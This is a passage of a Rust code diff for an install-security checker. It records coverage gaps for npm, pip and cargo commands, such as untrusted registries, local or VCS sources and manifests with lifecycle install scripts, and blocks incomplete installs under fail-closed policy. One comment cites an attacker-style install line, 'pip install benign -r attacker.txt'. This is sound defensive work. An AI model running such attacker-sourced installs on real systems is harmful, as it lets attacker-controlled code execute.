@@ -20,9 +20,10 @@ use crate::package_risk::{
     PackageSignals, RiskBreakdown,
 };
 use crate::policy::{FailMode, Policy};
+use crate::registry_api::canonical_registry_name;
 use crate::rules::threatintel::{self, PackageRef};
 use crate::threatdb::{Ecosystem, ThreatDb};
-use crate::tokenize::{self, ShellType};
+use crate::tokenize::{Segment, ShellType};
 use crate::verdict::{Action, Evidence, Finding, RuleId, Severity, Verdict};
 use crate::version_intent::VersionIntent;
 
@@ -151,8 +152,9 @@ impl PackageManager {
 
 /// The argv of the real install command, e.g.
 /// `["npm", "install", "left-pad", "--save-dev"]`. Executed directly via
-/// `std::process::Command`, never through a shell; the same tokens joined with
-/// spaces form [`InstallPlan::analysis_command`] (analysis/audit only).
+/// `std::process::Command`, never through a shell. A reversible POSIX-quoted
+/// rendering forms [`InstallPlan::analysis_command`] for the generic engine;
+/// install extraction itself consumes these structured tokens directly.
 #[derive(Debug, Clone, PartialEq, Eq)]
 pub struct InstallArgv {
     /// argv[0] — the package-manager program.
@@ -162,13 +164,109 @@ pub struct InstallArgv {
 }
 
 impl InstallArgv {
-    /// The command as a single human-readable string (display/audit); never
-    /// handed to a shell.
+    /// The command as one reversible analysis/audit string; never handed to a
+    /// shell. Every token is quoted independently so re-tokenizing cannot
+    /// merge, split, or reinterpret an argv element. This retains raw token
+    /// contents and is therefore **not terminal-safe**; human renderers must
+    /// apply their strict display sanitizer after calling it.
     pub fn display(&self) -> String {
-        if self.args.is_empty() {
-            self.program.clone()
-        } else {
-            format!("{} {}", self.program, self.args.join(" "))
+        std::iter::once(self.program.as_str())
+            .chain(self.args.iter().map(String::as_str))
+            .map(shell_quote_argv_token)
+            .collect::<Vec<_>>()
+            .join(" ")
+    }
+}
+
+fn shell_quote_argv_token(token: &str) -> String {
+    if !token.is_empty()
+        && token.bytes().all(|byte| {
+            byte.is_ascii_alphanumeric()
+                || matches!(
+                    byte,
+                    b'_' | b'-' | b'.' | b'/' | b':' | b'@' | b'%' | b'+' | b',' | b'='
+                )
+        })
+    {
+        return token.to_string();
+    }
+    format!("'{}'", token.replace('\'', "'\\''"))
+}
+
+/// Typed completeness state for the install-specific interpretation of argv.
+/// `Incomplete` is never inferred from `packages.is_empty()`; every executable
+/// operand is classified independently, including mixed package + manifest
+/// forms.
+#[derive(Debug, Clone, Copy, PartialEq, Eq, serde::Serialize)]
+#[serde(rename_all = "snake_case")]
+pub enum InstallCoverageState {
+    Complete,
+    Incomplete,
+}
+
+/// Why an install operand or provenance result could not be bound to what the
+/// package manager will execute.
+#[derive(Debug, Clone, Copy, PartialEq, Eq, serde::Serialize)]
+#[serde(rename_all = "snake_case")]
+pub enum InstallCoverageGapKind {
+    ManifestOrLocalSource,
+    RemoteOrVcsSource,
+    UnverifiedRegistry,
+    UnrecognizedArgument,
+    MissingArgumentValue,
+    NoRegistryAdapter,
+    UnresolvedVersion,
+    ProvenanceUnavailable,
+    ProvenanceMismatch,
+    InstallScriptUnavailable,
+    GapLimitReached,
+}
+
+#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize)]
+pub struct InstallCoverageGap {
+    pub kind: InstallCoverageGapKind,
+    pub argument: String,
+    pub reason: String,
+}
+
+#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize)]
+pub struct InstallCoverage {
+    pub state: InstallCoverageState,
+    pub gaps: Vec<InstallCoverageGap>,
+}
+
+impl Default for InstallCoverage {
+    fn default() -> Self {
+        Self {
+            state: InstallCoverageState::Complete,
+            gaps: Vec::new(),
+        }
+    }
+}
+
+impl InstallCoverage {
+    const MAX_GAPS: usize = 64;
+
+    fn push(&mut self, gap: InstallCoverageGap) {
+        self.state = InstallCoverageState::Incomplete;
+        if self.gaps.len() < Self::MAX_GAPS {
+            if !self
+                .gaps
+                .iter()
+                .any(|existing| existing.kind == gap.kind && existing.argument == gap.argument)
+            {
+                self.gaps.push(gap);
+            }
+        } else if !self
+            .gaps
+            .iter()
+            .any(|existing| existing.kind == InstallCoverageGapKind::GapLimitReached)
+        {
+            self.gaps.push(InstallCoverageGap {
+                kind: InstallCoverageGapKind::GapLimitReached,
+                argument: "<additional arguments>".to_string(),
+                reason: "more than 64 install coverage gaps were supplied; remaining operands were not silently treated as covered".to_string(),
+            });
         }
     }
 }
@@ -182,7 +280,8 @@ pub struct InstallPlan {
     pub manager: PackageManager,
     /// The exact argv of the real install command.
     pub argv: InstallArgv,
-    /// The argv joined into a string — analysis/audit only, never shell-executed.
+    /// The argv joined into a raw string — analysis/audit/structured output
+    /// only, never shell-executed or printed without terminal sanitization.
     pub analysis_command: String,
     /// The packages the transaction will install (empty for a flags-only /
     /// manifest install). Each carries its own [`RiskBreakdown`].
@@ -192,6 +291,9 @@ pub struct InstallPlan {
     pub verdict: Verdict,
     /// Coverage notes (missing threat DB, unrecognized spec) — honest limits.
     pub notes: Vec<String>,
+    /// Typed proof that every executable install input and online provenance
+    /// lookup was either bound or surfaced as an explicit gap.
+    pub coverage: InstallCoverage,
 }
 
 impl InstallPlan {
@@ -216,9 +318,14 @@ pub struct PlannedPackage {
 pub enum OnlineMode<'a> {
     /// Offline — every package's API signals are [`ApiSignals::NotComputed`].
     Off,
-    /// `--online` — an offline-safe closure resolving each `(ecosystem, name)`
-    /// to its [`ApiSignals`], called at most once per distinct package.
-    Resolver(&'a dyn Fn(Ecosystem, &str) -> ApiSignals),
+    /// `--online` — resolves only an exact `(ecosystem, name, version)` tuple.
+    /// Unpinned/ranged inputs never reach this seam, preventing latest-version
+    /// provenance from being attached to different installed bytes.
+    Resolver(&'a dyn Fn(Ecosystem, &str, &str) -> ApiSignals),
+    /// The real manager has ambient/project source configuration that Tirith
+    /// cannot bind to its official-registry client. No registry lookup runs;
+    /// this becomes an explicit blocking-grade coverage finding.
+    UnverifiedSource(&'a str),
 }
 
 /// Inputs to [`plan_install`], in a struct so the signature stays stable.
@@ -247,6 +354,31 @@ pub struct PlanRequest<'a> {
 /// derives the final [`Action`]. No network I/O except the caller's
 /// [`OnlineMode::Resolver`]; never panics.
 pub fn plan_install(request: &PlanRequest) -> InstallPlan {
+    plan_install_inner(request, NpmProjectManifestCoverage::DiscoverFromDisk)
+}
+
+/// Analyze an install using npm project-manifest coverage derived from the
+/// exact bytes already captured by the caller's source binding. The caller
+/// must keep that capture bound until spawn; passing `None` means the bound
+/// snapshot contained no applicable project manifest or executable inputs.
+/// This avoids a second filesystem read and its malicious-clean-malicious ABA
+/// window between analysis and pre-spawn identity verification.
+pub fn plan_install_with_captured_npm_manifest(
+    request: &PlanRequest,
+    captured_gap: Option<&InstallCoverageGap>,
+) -> InstallPlan {
+    plan_install_inner(request, NpmProjectManifestCoverage::Captured(captured_gap))
+}
+
+enum NpmProjectManifestCoverage<'a> {
+    DiscoverFromDisk,
+    Captured(Option<&'a InstallCoverageGap>),
+}
+
+fn plan_install_inner(
+    request: &PlanRequest,
+    npm_manifest_coverage: NpmProjectManifestCoverage<'_>,
+) -> InstallPlan {
     let manager = request.manager;
     let argv = build_argv(manager, request.user_args);
     let analysis_command = argv.display();
@@ -281,18 +413,33 @@ pub fn plan_install(request: &PlanRequest) -> InstallPlan {
     let command_verdict = engine::analyze(&ctx);
     let mut findings: Vec<Finding> = command_verdict.findings;
 
-    // (2)+(3) package extraction and scoring. Reuse the existing extractor for
-    // npm/pip/cargo; for Docker/Go the manager-specific parser is authoritative
-    // (and replaces the generic output to avoid duplicate PlannedPackage
-    // entries). The distro backends have no registry to score against and
-    // return empty — their verdict is command-shape + the no-adapter banner.
-    let segments = tokenize::tokenize(&analysis_command, ShellType::Posix);
+    // (2)+(3) package extraction and scoring. The install-specific path never
+    // re-tokenizes `analysis_command`: a Segment is built directly from the
+    // exact argv so spaces, empty values, quoting, and metacharacters retain
+    // their original argument identity.
     let extracted: Vec<PackageRef> = match manager {
         PackageManager::Docker | PackageManager::Go => {
             extract_packages_manager_specific(manager, request.user_args)
         }
-        _ => threatintel::extract_packages(&segments),
+        _ => extract_packages_from_argv(manager, &argv),
     };
+    let mut coverage = analyze_install_coverage(manager, request.user_args);
+    if manager == PackageManager::Npm {
+        let manifest_gap = match npm_manifest_coverage {
+            NpmProjectManifestCoverage::DiscoverFromDisk => {
+                npm_project_manifest_coverage_gap(request.cwd.as_deref(), request.user_args)
+            }
+            NpmProjectManifestCoverage::Captured(gap) => gap.cloned(),
+        };
+        if let Some(gap) = manifest_gap {
+            coverage.push(gap);
+        }
+    }
+    // Official provenance is attached only when the entire manager-specific
+    // input grammar is understood. An unknown option may itself alter source,
+    // cache, transport, or executable inputs; treating only known registry
+    // gaps as disqualifying would recreate the partial-coverage bypass.
+    let registry_source_verified = coverage.state == InstallCoverageState::Complete;
 
     // M6 ch1 — the `schemeless_to_sink` FP on `go install` / `docker pull` is
     // suppressed at the engine layer in `extract.rs`; nothing extra needed here.
@@ -301,9 +448,13 @@ pub fn plan_install(request: &PlanRequest) -> InstallPlan {
     let eco = manager.ecosystem();
     let mut planned: Vec<PlannedPackage> = Vec::new();
 
-    let online_in_use = matches!(request.online, OnlineMode::Resolver(_));
+    let online_in_use = !matches!(request.online, OnlineMode::Off);
     for pkg in extracted.into_iter().filter(|p| p.ecosystem == eco) {
-        let signals = gather_package_signals(request, eco, &pkg, &mut notes);
+        let (signals, signal_gap) =
+            gather_package_signals(request, eco, &pkg, registry_source_verified, &mut notes);
+        if let Some(gap) = signal_gap {
+            coverage.push(gap);
+        }
         let breakdown = package_risk::score_package(&signals);
 
         // M6 ch7 — the install-script signal needs `--online` (or on-disk script
@@ -313,14 +464,29 @@ pub fn plan_install(request: &PlanRequest) -> InstallPlan {
             .policy
             .package_policy
             .block_install_scripts_for_unknown_packages
-            && !online_in_use
             && matches!(signals.name_vs_popular, NameVsPopular::Unknown)
         {
-            notes.push(format!(
-                "(install-script signal not available offline — pass `--online` to evaluate \
-                 install-script policy for '{}')",
-                pkg.name
-            ));
+            let script_analysis_available = matches!(
+                &signals.api,
+                ApiSignals::Available { provenance }
+                    if provenance.install_script_signals.is_some()
+            );
+            if !script_analysis_available {
+                let reason = if online_in_use {
+                    "the exact selected artifact did not provide install-script evidence"
+                } else {
+                    "install-script analysis is unavailable offline"
+                };
+                notes.push(format!(
+                    "(install-script policy was not silently treated as evaluated for '{}': {reason})",
+                    pkg.name
+                ));
+                coverage.push(InstallCoverageGap {
+                    kind: InstallCoverageGapKind::InstallScriptUnavailable,
+                    argument: pkg.name.clone(),
+                    reason: reason.to_string(),
+                });
+            }
         }
 
         // Likewise: offline runs can't resolve `PackageExistence`, so
@@ -444,12 +610,69 @@ pub fn plan_install(request: &PlanRequest) -> InstallPlan {
         }
     }
 
+    // Every typed gap becomes an explicit decision input. Preserve the legacy
+    // manifest finding above for zero-package forms, but cover mixed forms such
+    // as `pip install benign -r attacker.txt` here as well.
+    let legacy_manifest_finding_present = planned.is_empty()
+        && findings
+            .iter()
+            .any(|finding| finding.title.contains("manifest install"));
+    for gap in &coverage.gaps {
+        if legacy_manifest_finding_present
+            && gap.kind == InstallCoverageGapKind::ManifestOrLocalSource
+        {
+            continue;
+        }
+        if gap.kind == InstallCoverageGapKind::NoRegistryAdapter
+            && !matches!(request.policy.fail_mode, FailMode::Closed)
+        {
+            continue;
+        }
+        findings.push(coverage_gap_finding(
+            manager,
+            gap,
+            &analysis_command,
+            request.policy,
+        ));
+    }
+
     // (5) compose the verdict — apply policy severity overrides, then derive
     // the action from the strongest finding (the shared max-severity mapping).
     for finding in &mut findings {
         if let Some(sev) = request.policy.severity_override(&finding.rule_id) {
             finding.severity = sev;
         }
+    }
+    if coverage.state == InstallCoverageState::Incomplete
+        && matches!(request.policy.fail_mode, FailMode::Closed)
+    {
+        // Strict coverage is an invariant, not a user-tunable rule severity.
+        // Append this floor after generic severity overrides so a broad
+        // ThreatSuspiciousPackage downgrade cannot turn unscored executable
+        // input into an allow/warn transaction.
+        findings.push(Finding {
+            rule_id: RuleId::ThreatSuspiciousPackage,
+            severity: Severity::High,
+            title: format!(
+                "{} install is blocked because executable-input coverage is incomplete",
+                manager.label()
+            ),
+            description: format!(
+                "Strict fail-closed policy requires every executable install input and its provenance to be covered. This transaction has {} explicit coverage gap(s), so severity overrides cannot lower it below Block.",
+                coverage.gaps.len()
+            ),
+            evidence: vec![Evidence::Text {
+                detail: format!(
+                    "manager={} coverage_state=incomplete gap_count={} fail_mode=closed",
+                    manager.label(),
+                    coverage.gaps.len()
+                ),
+            }],
+            human_view: None,
+            agent_view: None,
+            mitre_id: None,
+            custom_rule_id: None,
+        });
     }
     let mut verdict = Verdict::from_findings(
         findings,
@@ -466,6 +689,7 @@ pub fn plan_install(request: &PlanRequest) -> InstallPlan {
         packages: planned,
         verdict,
         notes,
+        coverage,
     }
 }
 
@@ -581,6 +805,1323 @@ pub fn build_argv(manager: PackageManager, user_args: &[String]) -> InstallArgv 
     InstallArgv {
         program: manager.program().to_string(),
         args,
+    }
+}
+
+/// Run the shared package extractor on an exact argv-backed segment. The
+/// extractor sees the same token vector that the CLI runner receives;
+/// `analysis_command` is deliberately not involved.
+fn extract_packages_from_argv(manager: PackageManager, argv: &InstallArgv) -> Vec<PackageRef> {
+    let raw = argv.display();
+    let segment = Segment {
+        byte_range: 0..raw.len(),
+        raw,
+        command: Some(manager.program().to_string()),
+        args: argv.args.clone(),
+        preceding_separator: None,
+    };
+    threatintel::extract_packages(std::slice::from_ref(&segment))
+}
+
+fn analyze_install_coverage(manager: PackageManager, user_args: &[String]) -> InstallCoverage {
+    let mut coverage = InstallCoverage::default();
+    if manager.lacks_registry_adapter() {
+        coverage.push(InstallCoverageGap {
+            kind: InstallCoverageGapKind::NoRegistryAdapter,
+            argument: manager.label().to_string(),
+            reason: format!(
+                "{} has no registry adapter, so its executable package operands cannot be provenance-bound",
+                manager.label()
+            ),
+        });
+    }
+    match manager {
+        PackageManager::Npm => analyze_npm_coverage(user_args, &mut coverage),
+        PackageManager::Pip => analyze_pip_coverage(user_args, &mut coverage),
+        PackageManager::Cargo => analyze_cargo_coverage(user_args, &mut coverage),
+        PackageManager::Apt
+        | PackageManager::Brew
+        | PackageManager::Dnf
+        | PackageManager::Yum
+        | PackageManager::Pacman
+        | PackageManager::Scoop
+        | PackageManager::Docker
+        | PackageManager::Go => {}
+    }
+    coverage
+}
+
+fn missing_value_gap(coverage: &mut InstallCoverage, flag: &str) {
+    coverage.push(InstallCoverageGap {
+        kind: InstallCoverageGapKind::MissingArgumentValue,
+        argument: flag.to_string(),
+        reason: format!("{flag} requires a following value, so the install grammar is incomplete"),
+    });
+}
+
+fn manifest_gap(coverage: &mut InstallCoverage, argument: &str, reason: &str) {
+    coverage.push(InstallCoverageGap {
+        kind: InstallCoverageGapKind::ManifestOrLocalSource,
+        argument: argument.to_string(),
+        reason: reason.to_string(),
+    });
+}
+
+fn remote_source_gap(coverage: &mut InstallCoverage, argument: &str, reason: &str) {
+    coverage.push(InstallCoverageGap {
+        kind: InstallCoverageGapKind::RemoteOrVcsSource,
+        argument: argument.to_string(),
+        reason: reason.to_string(),
+    });
+}
+
+fn registry_gap(coverage: &mut InstallCoverage, argument: &str, reason: &str) {
+    coverage.push(InstallCoverageGap {
+        kind: InstallCoverageGapKind::UnverifiedRegistry,
+        argument: argument.to_string(),
+        reason: reason.to_string(),
+    });
+}
+
+fn unknown_flag_gap(coverage: &mut InstallCoverage, argument: &str, manager: PackageManager) {
+    coverage.push(InstallCoverageGap {
+        kind: InstallCoverageGapKind::UnrecognizedArgument,
+        argument: argument.to_string(),
+        reason: format!(
+            "tirith does not classify this {} install option and cannot prove that it introduces no executable input",
+            manager.label()
+        ),
+    });
+}
+
+const MAX_NPM_PROJECT_MANIFEST_BYTES: u64 = 1024 * 1024;
+
+/// npm can merge the current project's dependencies and lifecycle scripts into
+/// an install even when the user also supplied an explicit package operand.
+/// Surface that implicit executable input before official provenance is used.
+fn npm_project_manifest_coverage_gap(
+    cwd: Option<&str>,
+    args: &[String],
+) -> Option<InstallCoverageGap> {
+    if npm_install_uses_global_location(args) {
+        return None;
+    }
+    let cwd = std::path::Path::new(cwd?);
+    for ancestor in cwd.ancestors() {
+        let manifest = ancestor.join("package.json");
+        let bytes = match crate::util::read_text_no_follow_capped(
+            &manifest,
+            MAX_NPM_PROJECT_MANIFEST_BYTES,
+        ) {
+            Ok(bytes) => bytes,
+            Err(crate::util::OpenRegularError::NotFound) => continue,
+            Err(
+                crate::util::OpenRegularError::NotRegularFile
+                | crate::util::OpenRegularError::TooLarge,
+            ) => {
+                return Some(InstallCoverageGap {
+                    kind: InstallCoverageGapKind::ManifestOrLocalSource,
+                    argument: manifest.display().to_string(),
+                    reason: format!(
+                        "npm project manifest is not a regular file bounded to {MAX_NPM_PROJECT_MANIFEST_BYTES} bytes"
+                    ),
+                });
+            }
+            Err(crate::util::OpenRegularError::Io(error)) => {
+                return Some(InstallCoverageGap {
+                    kind: InstallCoverageGapKind::ManifestOrLocalSource,
+                    argument: manifest.display().to_string(),
+                    reason: format!(
+                        "npm project manifest could not be read before install: {error}"
+                    ),
+                });
+            }
+        };
+        let content = match String::from_utf8(bytes) {
+            Ok(content) => content,
+            Err(error) => {
+                return Some(InstallCoverageGap {
+                    kind: InstallCoverageGapKind::ManifestOrLocalSource,
+                    argument: manifest.display().to_string(),
+                    reason: format!(
+                        "npm project manifest is not valid UTF-8 and cannot be inspected: {error}"
+                    ),
+                });
+            }
+        };
+        if let Some(gap) = npm_project_manifest_content_coverage_gap(&manifest, &content) {
+            return Some(gap);
+        }
+    }
+    None
+}
+
+/// Derive npm project-manifest coverage from bytes captured and fingerprinted
+/// by the caller. This function performs no filesystem read; pairing its result
+/// with pre-spawn verification of the same capture closes manifest ABA races.
+pub fn captured_npm_project_manifest_coverage_gap(
+    path: &std::path::Path,
+    content: &str,
+    args: &[String],
+) -> Option<InstallCoverageGap> {
+    if npm_install_uses_global_location(args) {
+        return None;
+    }
+    npm_project_manifest_content_coverage_gap(path, content)
+}
+
+fn npm_project_manifest_content_coverage_gap(
+    manifest: &std::path::Path,
+    content: &str,
+) -> Option<InstallCoverageGap> {
+    let parsed: serde_json::Value = match serde_json::from_str(content) {
+        Ok(parsed) => parsed,
+        Err(error) => {
+            return Some(InstallCoverageGap {
+                kind: InstallCoverageGapKind::ManifestOrLocalSource,
+                argument: manifest.display().to_string(),
+                reason: format!("npm project manifest could not be parsed before install: {error}"),
+            });
+        }
+    };
+    let mut executable_inputs = Vec::new();
+    for key in [
+        "dependencies",
+        "devDependencies",
+        "optionalDependencies",
+        "peerDependencies",
+        "overrides",
+    ] {
+        if parsed
+            .get(key)
+            .and_then(serde_json::Value::as_object)
+            .is_some_and(|values| !values.is_empty())
+        {
+            executable_inputs.push(key);
+        }
+    }
+    if parsed.get("workspaces").is_some_and(|workspaces| {
+        workspaces
+            .as_array()
+            .is_some_and(|values| !values.is_empty())
+            || workspaces
+                .as_object()
+                .is_some_and(|values| !values.is_empty())
+    }) {
+        executable_inputs.push("workspaces");
+    }
+    if parsed
+        .get("scripts")
+        .and_then(serde_json::Value::as_object)
+        .is_some_and(|scripts| {
+            [
+                "preinstall",
+                "install",
+                "postinstall",
+                "prepublish",
+                "preprepare",
+                "prepare",
+                "postprepare",
+                "predependencies",
+                "dependencies",
+                "postdependencies",
+            ]
+            .iter()
+            .any(|hook| {
+                scripts
+                    .get(*hook)
+                    .and_then(serde_json::Value::as_str)
+                    .is_some_and(|body| !body.trim().is_empty())
+            })
+        })
+    {
+        executable_inputs.push("install lifecycle scripts");
+    }
+    (!executable_inputs.is_empty()).then(|| InstallCoverageGap {
+        kind: InstallCoverageGapKind::ManifestOrLocalSource,
+        argument: manifest.display().to_string(),
+        reason: format!(
+            "npm may install or execute unscored current-project inputs from {} ({})",
+            manifest.display(),
+            executable_inputs.join(", ")
+        ),
+    })
+}
+
+fn npm_install_uses_global_location(args: &[String]) -> bool {
+    let mut global = false;
+    let mut index = 0;
+    while index < args.len() {
+        let argument = &args[index];
+        if argument == "--" {
+            break;
+        }
+        match argument.as_str() {
+            "-g" | "--global" => {
+                if let Some(value) = args.get(index.saturating_add(1)) {
+                    if value.eq_ignore_ascii_case("false") {
+                        global = false;
+                        index = index.saturating_add(2);
+                        continue;
+                    }
+                    if value.eq_ignore_ascii_case("true") {
+                        global = true;
+                        index = index.saturating_add(2);
+                        continue;
+                    }
+                }
+                global = true;
+            }
+            "--global=true" => global = true,
+            "--global=false" | "--no-global" => global = false,
+            _ => {}
+        }
+        index = index.saturating_add(1);
+    }
+    global
+}
+
+fn analyze_npm_coverage(args: &[String], coverage: &mut InstallCoverage) {
+    if args.is_empty() {
+        manifest_gap(
+            coverage,
+            "(no package argument)",
+            "npm will read the local package manifest and lockfile",
+        );
+        return;
+    }
+    const VALUE_FLAGS: &[&str] = &[
+        "--tag",
+        "--scope",
+        "--otp",
+        "--before",
+        "--install-strategy",
+        "--omit",
+        "--include",
+    ];
+    const BOOL_FLAGS: &[&str] = &[
+        "--save",
+        "--save-dev",
+        "--save-optional",
+        "--save-peer",
+        "--save-exact",
+        "--ignore-scripts",
+        "--foreground-scripts",
+        "--dry-run",
+        "--force",
+        "--legacy-peer-deps",
+        "--strict-peer-deps",
+        "--audit",
+        "--no-audit",
+        "--fund",
+        "--no-fund",
+        "--production",
+        "--prefer-online",
+        "--include-workspace-root",
+        "-D",
+        "-O",
+        "-P",
+        "-E",
+    ];
+
+    let mut index = 0;
+    let mut saw_package_operand = false;
+    while index < args.len() {
+        let argument = &args[index];
+        if argument == "--" {
+            index += 1;
+            continue;
+        }
+        if matches!(argument.as_str(), "-g" | "--global") {
+            if args.get(index + 1).is_some_and(|value| {
+                value.eq_ignore_ascii_case("true") || value.eq_ignore_ascii_case("false")
+            }) {
+                index += 2;
+            } else {
+                index += 1;
+            }
+            continue;
+        }
+        if argument == "--registry" {
+            if let Some(value) = args.get(index + 1) {
+                if !is_official_registry(PackageManager::Npm, value) {
+                    registry_gap(
+                        coverage,
+                        &format!("--registry {value}"),
+                        "npm will install from a registry other than the validated npm origin",
+                    );
+                }
+                index += 2;
+            } else {
+                missing_value_gap(coverage, argument);
+                index += 1;
+            }
+            continue;
+        }
+        if let Some(value) = argument.strip_prefix("--registry=") {
+            if value.is_empty() {
+                missing_value_gap(coverage, "--registry");
+            } else if !is_official_registry(PackageManager::Npm, value) {
+                registry_gap(
+                    coverage,
+                    argument,
+                    "npm will install from a registry other than the validated npm origin",
+                );
+            }
+            index += 1;
+            continue;
+        }
+        if matches!(argument.as_str(), "--userconfig" | "--globalconfig") {
+            if let Some(value) = args.get(index + 1) {
+                registry_gap(
+                    coverage,
+                    &format!("{argument} {value}"),
+                    "npm will load source selection from an alternate configuration file",
+                );
+                index += 2;
+            } else {
+                missing_value_gap(coverage, argument);
+                index += 1;
+            }
+            continue;
+        }
+        if argument.starts_with("--userconfig=") || argument.starts_with("--globalconfig=") {
+            registry_gap(
+                coverage,
+                argument,
+                "npm will load source selection from an alternate configuration file",
+            );
+            index += 1;
+            continue;
+        }
+        if argument == "--prefix" {
+            if let Some(value) = args.get(index + 1) {
+                manifest_gap(
+                    coverage,
+                    &format!("--prefix {value}"),
+                    "npm will resolve project and configuration inputs from an alternate prefix outside the ordinary transaction context",
+                );
+                index += 2;
+            } else {
+                missing_value_gap(coverage, argument);
+                index += 1;
+            }
+            continue;
+        }
+        if argument.starts_with("--prefix=") {
+            manifest_gap(
+                coverage,
+                argument,
+                "npm will resolve project and configuration inputs from an alternate prefix outside the ordinary transaction context",
+            );
+            index += 1;
+            continue;
+        }
+        if argument == "--cache" {
+            if let Some(value) = args.get(index + 1) {
+                registry_gap(
+                    coverage,
+                    &format!("--cache {value}"),
+                    "npm may reuse package bytes from an alternate cache that is not bound to the validated registry response",
+                );
+                index += 2;
+            } else {
+                missing_value_gap(coverage, argument);
+                index += 1;
+            }
+            continue;
+        }
+        if argument.starts_with("--cache=") {
+            registry_gap(
+                coverage,
+                argument,
+                "npm may reuse package bytes from an alternate cache that is not bound to the validated registry response",
+            );
+            index += 1;
+            continue;
+        }
+        if matches!(argument.as_str(), "--offline" | "--prefer-offline") {
+            registry_gap(
+                coverage,
+                argument,
+                "npm may install cached package bytes without obtaining the validated registry response",
+            );
+            index += 1;
+            continue;
+        }
+        if argument == "--no-package-lock" {
+            if args
+                .get(index + 1)
+                .is_some_and(|value| value.eq_ignore_ascii_case("false"))
+            {
+                manifest_gap(
+                    coverage,
+                    "--no-package-lock false",
+                    "npm re-enables package-lock.json or npm-shrinkwrap.json when the negated option receives false",
+                );
+                index += 2;
+            } else if args
+                .get(index + 1)
+                .is_some_and(|value| value.eq_ignore_ascii_case("true"))
+            {
+                index += 2;
+            } else {
+                index += 1;
+            }
+            continue;
+        }
+        if let Some(value) = argument.strip_prefix("--no-package-lock=") {
+            if value.eq_ignore_ascii_case("false") {
+                manifest_gap(
+                    coverage,
+                    argument,
+                    "npm re-enables package-lock.json or npm-shrinkwrap.json when the negated option receives false",
+                );
+            } else if !value.eq_ignore_ascii_case("true") {
+                unknown_flag_gap(coverage, argument, PackageManager::Npm);
+            }
+            index += 1;
+            continue;
+        }
+        if argument == "--package-lock"
+            || argument
+                .strip_prefix("--package-lock=")
+                .is_some_and(|value| value != "false")
+        {
+            manifest_gap(
+                coverage,
+                argument,
+                "npm may consume package-lock.json or npm-shrinkwrap.json resolved URLs that were not included in per-package provenance",
+            );
+            index += 1;
+            continue;
+        }
+        if argument == "--package-lock=false" {
+            index += 1;
+            continue;
+        }
+        if argument == "--workspaces" {
+            manifest_gap(
+                coverage,
+                argument,
+                "npm will add dependencies selected from workspace manifests",
+            );
+            index += 1;
+            continue;
+        }
+        if argument == "--workspace" || argument == "-w" {
+            if let Some(value) = args.get(index + 1) {
+                manifest_gap(
+                    coverage,
+                    &format!("{argument} {value}"),
+                    "npm will add dependencies selected from a workspace manifest",
+                );
+                index += 2;
+            } else {
+                missing_value_gap(coverage, argument);
+                index += 1;
+            }
+            continue;
+        }
+        if argument.starts_with("--workspace=") {
+            manifest_gap(
+                coverage,
+                argument,
+                "npm will add dependencies selected from a workspace manifest",
+            );
+            index += 1;
+            continue;
+        }
+        if VALUE_FLAGS.contains(&argument.as_str()) {
+            if args.get(index + 1).is_some() {
+                index += 2;
+            } else {
+                missing_value_gap(coverage, argument);
+                index += 1;
+            }
+            continue;
+        }
+        if VALUE_FLAGS
+            .iter()
+            .any(|flag| argument.starts_with(&format!("{flag}=")))
+            || BOOL_FLAGS.contains(&argument.as_str())
+        {
+            index += 1;
+            continue;
+        }
+        if argument.starts_with('-') {
+            unknown_flag_gap(coverage, argument, PackageManager::Npm);
+            index += 1;
+            continue;
+        }
+        saw_package_operand = true;
+        classify_npm_operand(argument, coverage);
+        index += 1;
+    }
+
+    // `npm install` remains manifest-driven when the command contains only
+    // options. This form is reachable through the public CLI even though an
+    // entirely empty argument vector is rejected there; options such as
+    // `--foreground-scripts` still install the current project and execute its
+    // lifecycle hooks.
+    if !saw_package_operand {
+        manifest_gap(
+            coverage,
+            "(no package operand)",
+            "npm will read the local package manifest and lockfile because no explicit package operand was supplied",
+        );
+    }
+}
+
+fn classify_npm_operand(argument: &str, coverage: &mut InstallCoverage) {
+    let lower = argument.to_ascii_lowercase();
+    let source_spec = npm_source_spec(argument);
+    let source_lower = source_spec.unwrap_or(argument).to_ascii_lowercase();
+    let local_archive = [".tgz", ".tar", ".tar.gz", ".tar.bz2", ".tar.xz", ".zip"]
+        .iter()
+        .any(|suffix| lower.ends_with(suffix));
+    let local_source = source_lower.starts_with("file:")
+        || source_lower.starts_with("link:")
+        || source_lower.starts_with("workspace:")
+        || source_lower.starts_with("./")
+        || source_lower.starts_with("../")
+        || source_lower.starts_with('/')
+        || source_lower.contains('\\')
+        || local_archive;
+    if local_source
+        || lower.starts_with("file:")
+        || lower.starts_with("link:")
+        || lower.starts_with("workspace:")
+        || argument.starts_with('.')
+        || argument.starts_with('/')
+        || argument.starts_with('~')
+        || argument.contains('\\')
+    {
+        manifest_gap(
+            coverage,
+            argument,
+            "npm will install executable package content from a local or workspace source",
+        );
+    } else if lower.contains("@npm:")
+        || is_npm_remote_source(&source_lower)
+        || argument.contains("://")
+        || !is_valid_npm_registry_spec(argument)
+    {
+        remote_source_gap(
+            coverage,
+            argument,
+            "npm will install executable package content from an alias, URL, VCS, or shorthand source",
+        );
+    }
+}
+
+/// Return the portion after an npm package name when the operand is a named
+/// spec (`name@spec` or `@scope/name@spec`). A bare scoped package has no
+/// source spec.
+fn npm_source_spec(argument: &str) -> Option<&str> {
+    if argument.starts_with('@') {
+        let slash = argument.find('/')?;
+        let tail = &argument[slash + 1..];
+        let at = tail.find('@')?;
+        Some(&tail[at + 1..])
+    } else {
+        argument
+            .find('@')
+            .map(|at| &argument[at.saturating_add(1)..])
+    }
+}
+
+fn is_npm_remote_source(spec_lower: &str) -> bool {
+    spec_lower.starts_with("git+")
+        || spec_lower.starts_with("git@")
+        || spec_lower.starts_with("git:")
+        || spec_lower.starts_with("gist:")
+        || spec_lower.starts_with("github:")
+        || spec_lower.starts_with("gitlab:")
+        || spec_lower.starts_with("bitbucket:")
+        || spec_lower.starts_with("http:")
+        || spec_lower.starts_with("https:")
+        || spec_lower.contains("://")
+}
+
+/// Conservative npm registry-spec recognizer. Anything that is not a plain
+/// package identity plus an optional registry version/tag/range is surfaced as
+/// a direct-source gap instead of being silently treated as registry-backed.
+fn is_valid_npm_registry_spec(argument: &str) -> bool {
+    if argument.is_empty() || argument.chars().any(char::is_control) {
+        return false;
+    }
+    let (name, spec) = if argument.starts_with('@') {
+        let Some(slash) = argument.find('/') else {
+            return false;
+        };
+        let scope = &argument[1..slash];
+        let tail = &argument[slash + 1..];
